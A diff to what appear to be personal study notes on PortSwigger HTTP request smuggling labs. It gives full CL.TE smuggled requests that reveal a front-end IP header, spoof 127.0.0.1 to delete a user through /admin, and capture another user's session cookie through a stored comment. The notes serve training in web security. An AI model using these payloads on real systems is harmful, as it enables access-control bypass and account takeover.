@@ -4197,7 +4197,70 @@ Response: Communication timed out. (chunked size is 5)
     ```
 - Exploiting HTTP request smuggling to **reveal front-end request rewriting**
   - Info: This lab involves a front-end and back-end server, and the **front-end server doesn't support chunked encoding**. There's an admin panel at /admin, but it's only accessible to people with the IP address **127.0.0.1**. The front-end server adds an HTTP header to incoming requests containing their IP address. It's **similar to the X-Forwarded-For header** but has a different name. To solve the lab, smuggle a request to the back-end server that reveals the header that is added by the front-end server. Then smuggle a request to the back-end server that includes the added header, accesses the admin panel, and deletes the user carlos.
-- dd
+  - https://www.youtube.com/watch?v=gRIUDNZt_po
+  - Retrive the Ip header reveal in response (send request twice)
+    ```
+    POST / HTTP/1.1
+    Host: 0ad600c004b4045f8008672100c300fc.web-security-academy.net
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 120
+    Transfer-Encoding: chunked
+
+    0
+
+    POST / HTTP/1.1
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 99
+    Connection: close
+
+    search=test
+
+    Response
+     <h1>0 search results for 'tPOST / HTTP/1.1
+	X-gOFNwi-Ip: 116.87.25.165
+	Host: 0ad600c004b4045f8008672100c300fc.web-sec'</h1>
+    ```
+ - change the smuggled request URL to delete the user carlos
+   ```
+   POST / HTTP/1.1
+    Host: 0ad600c004b4045f8008672100c300fc.web-security-academy.net
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 165
+    Transfer-Encoding: chunked
+
+    0
+
+    GET /admin/delete?username=carlos HTTP/1.1
+    X-gOFNwi-Ip: 127.0.0.1
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 6
+    Connection: close
+
+    x=1
+   ```
+- Exploiting HTTP request smuggling to **capture other users' requests**
+  - Info: This lab involves a front-end and back-end server, and the **front-end server doesn't support chunked encoding**. To solve the lab, smuggle a request to the back-end server that causes the next user's request to be stored in the application. Then retrieve the next user's request and use the victim user's cookies to access their account.
+  - https://www.youtube.com/watch?v=lXtZU7AGtus
+  - Visit a blog post and post a comment
+  - Increase the comment-post request's Content-Length to 400, then smuggle it to the back-end server (Keep increase the content-length untill you see other cookie)
+    cut your comment and paste to lart part of body param
+    ```
+    POST / HTTP/1.1
+    Host: YOUR-LAB-ID.web-security-academy.net
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 256
+    Transfer-Encoding: chunked
+
+    0
+
+    POST /post/comment HTTP/1.1
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 900
+    Cookie: session=your-session-token
+
+    csrf=your-csrf-token&postId=5&name=Carlos+Montoya&email=carlos%40normal-user.net&website=&comment=test
+    ```
+  - Copy the user's Cookie header from the comment, and use it to access their account
 - dd 
 - dd
 - dd
